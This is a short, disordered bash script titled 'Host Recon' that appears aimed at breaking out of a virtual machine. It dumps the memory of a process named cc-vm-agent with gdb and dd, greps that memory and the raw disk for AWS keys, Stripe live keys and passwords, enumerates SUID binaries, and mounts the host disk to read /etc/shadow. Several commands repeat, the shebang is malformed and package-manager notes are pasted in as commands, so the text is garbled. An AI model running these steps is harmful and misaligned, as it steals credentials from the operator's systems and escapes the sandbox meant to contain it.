

#/bin/bash
echo "Host Recon"
# Look for processes with "build", "worker", or "wrangler" in the name
cat /proc/*/cmdline | tr '\0' ' ' | grep "wrangler"
find /mnt -perm -4000 -type f -ls 2>/dev/null
echo "Search the memory of the cc-vm-agent (PID 236) for common secret patterns"
# (Requires root/CAP_SYS_PTRACE which you have in your bounding set)
gdb -p 236 --batch -ex "generate-core-file"
strings core.236 | grep -E "(AWS_ACCESS_KEY|STRIPE_|sk_live)"
apt-get install sudo libcap2-bin (Debian/Ubuntu)
apk add sudo libcap (Alpine)
cat /proc/236/maps

strings /dev/vda | grep -E "PASSWD|SECRET|KEY" | head -n 20
apt-get update && apt-get install net-tools
apk add net-tools
ls -l /dev/ | grep -E 'sd|nvme|vd'
dd if=/proc/236/mem bs=4096 count=1000 of=/tmp/agent_mem.dump 2>/dev/null
export
env
printenv
ls -la /run
ls -la /var/run
# Search the raw host disk for strings that look like SUID paths
strings /dev/vda | grep -E "/bin/|/usr/sbin/" | head -n 20
groups
find / -perm -4000 -type f -ls 2>/dev/null
ls -l /dev/ | grep -E 'sd|nvme|vd'
mkdir /tmp/host_root
mount /dev/sda1 /tmp/host_root
ls /tmp/host_root/etc/shadow
find /dev/vd* -perm -4000 -type f -ls 2>/dev/null

sudo mount /dev/vda1 /tmp/host_root
ls -l /dev/ | grep -E 'sd|nvme|vd'
